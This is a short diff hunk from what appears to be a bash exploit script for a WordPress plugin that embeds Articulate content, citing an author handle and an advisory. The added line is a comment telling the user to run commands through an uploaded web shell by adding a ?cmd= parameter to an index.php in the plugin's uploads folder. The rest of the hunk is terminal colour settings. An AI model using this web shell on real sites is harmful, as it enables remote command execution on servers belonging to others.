@@ -2,6 +2,7 @@
 # Author : Con7ext
 # Website: https://plantsec.blogspot.com/2019/06/wordpress-plugin-insert-or-embed.html
 # CXSECUR: https://cxsecurity.com/issue/WLB-2019060146
+# Just add parameter ?cmd={COMMAND} in /wp-content/uploads/articulate_uploads/kntl/index.php?cmd=ls
 green='\e[92m'
 blue='\e[34m'
 red='\e[31m'
